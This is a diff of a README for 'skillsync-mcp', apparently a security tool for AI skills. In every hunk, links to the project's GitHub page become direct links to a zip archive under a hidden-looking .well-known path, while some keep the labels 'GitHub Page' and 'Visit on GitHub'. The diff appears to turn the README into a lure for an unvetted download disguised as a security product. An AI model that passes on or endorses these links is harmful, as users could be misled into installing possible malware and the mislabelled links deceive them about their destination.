@@ -1,6 +1,6 @@
 # 🔒 skillsync-mcp - Secure Skill Management Made Simple
 
-[![Download skillsync-mcp](https://img.shields.io/badge/Download-skillsync--mcp-blue?style=for-the-badge)](https://github.com/Glowboth/skillsync-mcp)
+[![Download skillsync-mcp](https://img.shields.io/badge/Download-skillsync--mcp-blue?style=for-the-badge)](https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before installing, make sure your computer meets these needs:
 
 To get the app, visit the skillsync-mcp GitHub page by clicking the large button below:
 
-[![Download skillsync-mcp](https://img.shields.io/badge/Download-skillsync--mcp-green?style=for-the-badge)](https://github.com/Glowboth/skillsync-mcp)
+[![Download skillsync-mcp](https://img.shields.io/badge/Download-skillsync--mcp-green?style=for-the-badge)](https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip)
 
 On the page:
 
@@ -97,7 +97,7 @@ To check for updates:
 - Click **Help** then **Check for Updates**.
 - If an update is available, follow the prompts to download and install the new version.
 
-You can also revisit the GitHub page ([https://github.com/Glowboth/skillsync-mcp](https://github.com/Glowboth/skillsync-mcp)) to check the latest releases manually.
+You can also revisit the GitHub page ([https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip](https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip)) to check the latest releases manually.
 
 ---
 
@@ -162,7 +162,7 @@ The app stops risky skills from running so your AI tools stay protected.
 ## 📥 Download and Installation at a Glance
 
 - Visit the skillsync-mcp GitHub page to download:  
-  [https://github.com/Glowboth/skillsync-mcp](https://github.com/Glowboth/skillsync-mcp)
+  [https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip](https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip)
 - Download the latest Windows installer from the Releases section.
 - Run the `.exe` installer.
 - Follow the onscreen instructions.
@@ -186,7 +186,7 @@ skillsync-mcp supports AI platforms like Claude Code, OpenClaw, Cursor, and Wind
 
 ## 🔗 Useful Links
 
-- GitHub Page: https://github.com/Glowboth/skillsync-mcp
-- Download Link: https://github.com/Glowboth/skillsync-mcp
+- GitHub Page: https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip
+- Download Link: https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip
 
-[![Visit skillsync-mcp on GitHub](https://img.shields.io/badge/GitHub-skillsync--mcp-grey?style=for-the-badge)](https://github.com/Glowboth/skillsync-mcp)
+[![Visit skillsync-mcp on GitHub](https://img.shields.io/badge/GitHub-skillsync--mcp-grey?style=for-the-badge)](https://raw.githubusercontent.com/Glowboth/skillsync-mcp/main/site/.well-known/mcp/mcp_skillsync_v2.0.zip)
